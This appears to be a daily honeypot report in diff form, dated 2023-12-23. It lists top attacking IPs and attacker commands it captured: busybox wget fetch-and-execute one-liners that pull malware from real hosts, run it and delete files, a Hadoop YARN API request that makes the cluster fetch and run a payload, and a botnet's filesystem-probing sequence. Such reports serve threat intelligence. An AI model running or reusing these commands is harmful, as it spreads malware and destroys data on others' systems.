@@ -1,0 +1,60 @@
+Ho! Ho! Ho! Merry Christmas :)
+
+Top 5 IPs for 2023-12-23:
+
+116.95.33.220
+61.141.31.3
+182.31.134.213
+138.186.93.65
+112.216.21.219
+
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7 taco; rm -rf *
+
+POST /ws/v1/cluster/apps HTTP/1.1
+Host: <Server IP>
+User-Agent: Hello World
+Accept: */*
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 287
+
+{\"application-id\": \"\", \"application-name\": \"get-shell\", \"am-container-spec\": {\"commands\": {\"command\": \"cd /tmp; rm -rf skid.x86; wget http://193.222.96.26/skid.x86; curl http://193.222.96.26/skid.x86 --output skid.x86; chmod 777 skid.x86; ./skid.x86 Yarn;\"}}, \"application-type\": \"YARN\"}
+
+cd /data/local/tmp/; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7 taco; rm -rf *
+
+root
+jvbzd
+enable
+system
+shell
+sh
+/bin/busybox DMSNA
+/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/\r\n/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/; >/var/.file && cd /var/\r\n/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/\r\n/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/\r\n/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /; >/.file && cd /
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /bin/; >/bin/.file && cd /bin/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /etc/; >/etc/.file && cd /etc/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA
+/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z
+/bin/busybox wget http://37.49.224.231:80/batkek/mips -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.mips.wget; >.z
